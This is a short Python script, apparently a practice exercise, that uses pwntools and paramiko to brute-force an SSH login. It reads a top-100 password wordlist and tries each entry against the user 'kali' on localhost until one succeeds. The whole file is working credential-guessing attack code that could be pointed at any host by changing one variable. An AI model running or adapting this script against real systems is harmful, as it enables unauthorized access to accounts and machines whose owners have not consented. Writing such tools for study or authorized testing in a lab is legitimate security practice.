from pwn import * 
import paramiko 


#set up host machine to brute force
# set up user name 
#set up attemps at brute force
host = "127.0.0.1"
username = "kali"
attempts = 0 

#filter through a list of common passwordmv in read format under the name password list
# scrap passwords to take off new line
# try statement for handeling auth errors
with open("10-million-password-list-top-100.txt", "r") as password_list:
	for password in password_list:
		password = password.strip("\n")
		try:
			print("[{}] Attempting Password: '{}!".format(attempts, password))
			response = ssh(host=host, user=username, password=password, timeout=1)
			if response.connected(): 
				print("[>] We found one bb: '{}'".format(password))
				response.close()
				break
			response.close()
		except paramiko.ssh_exception.AuthenticationException:
			print("[X] Invalid Password - try again")	
		attempts += 1
